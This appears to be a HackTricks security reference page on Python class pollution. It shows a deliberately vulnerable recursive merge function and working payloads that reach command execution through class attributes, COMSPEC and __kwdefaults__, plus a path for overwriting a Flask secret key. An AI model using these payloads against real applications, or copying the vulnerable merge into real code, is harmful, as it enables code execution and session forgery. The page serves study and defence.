# Class Pollution (Python's Prototype Pollution)

{{#include ../../banners/hacktricks-training.md}}

## Basic Example

Changing `__qualname__` through an instance's class reference updates the class and its mutable base classes.<sup>[[1]](#references)</sup>

```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```

## Basic Vulnerability Example

A recursive merge can accept attacker-controlled mapping keys and write nested values through either item or attribute access.<sup>[[1]](#references)</sup>

```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


USER_INPUT = {
    "name":"Ahemd",
    "age": 23,
    "manager":{
        "name":"Sarah"
    }
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```

## Gadget Examples

<details>

<summary>Creating class property default value to RCE (subprocess)</summary>

A shared base class can supply a default attribute consumed by a sibling-class command gadget.<sup>[[1]](#references)</sup>

```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
    def execute_command(self):
        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

USER_INPUT = {
    "__class__":{
        "__base__":{
            "__base__":{
                "custom_command": "whoami"
            }
        }
    }
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```

</details>

<details>

<summary>Polluting other classes and global vars through <code>globals</code></summary>

A function's `__globals__` mapping exposes the module namespace reachable from a method defined in that module.<sup>[[1]](#references)[[4]](#references)</sup>

```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class User:
    def __init__(self):
        pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```

</details>

<details>

<summary>Arbitrary subprocess execution</summary>

On Windows, `Popen(..., shell=True)` uses the `COMSPEC` environment variable as the default shell, so this gadget demonstrates environment-backed command redirection.<sup>[[1]](#references)[[5]](#references)</sup>

```python
import subprocess, json

class Employee:
    def __init__(self):
        pass

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```

</details>

<details>

<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>

Python documents `__kwdefaults__` as the mapping of default values for keyword-only parameters, which follow `*` or `*args` in a function definition.<sup>[[4]](#references)</sup> The following gadget overwrites that mapping through a polluted function path.<sup>[[1]](#references)</sup>

```python
from os import system
import json

def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Employee:
    def __init__(self):
        pass

def execute(*, command='whoami'):
    print(f'Executing {command}')
    system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```

</details>

<details>

<summary>Overwriting Flask secret across files</summary>

If the polluted object's class lives in a module different from the application's entry-point module, its methods' `__globals__` initially expose the class module's namespace. A traversal through the loader and `sys.modules.__main__` can then reach the entry-point module and its Flask `app` object.<sup>[[1]](#references)[[2]](#references)</sup>

```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```

Flask uses `app.secret_key` to sign the session cookie; knowing the key allows an attacker to create valid session data.<sup>[[6]](#references)</sup>

The original writeup demonstrates the following path to reach `app.secret_key`; CTFtime also hosts a copy of the writeup.<sup>[[2]](#references)[[3]](#references)</sup>

```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```

Changing the key can allow signing replacement session cookies and may enable privilege escalation; see [the Flask session tooling page](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).<sup>[[6]](#references)</sup>

</details>

Check also the following page for more read only gadgets:


{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## References

- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
- [2] [idekCTF 2022 task manager writeup (original)](https://kdxcxs.github.io/posts/wp/idekctf-2022-task-manager-wp/)
- [3] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
- [4] [inspect — Inspect live objects](https://docs.python.org/3/library/inspect.html)
- [5] [subprocess — Subprocess management](https://docs.python.org/3/library/subprocess.html)
- [6] [Quickstart — Flask Documentation](https://flask.palletsprojects.com/en/stable/quickstart/)

{{#include ../../banners/hacktricks-training.md}}
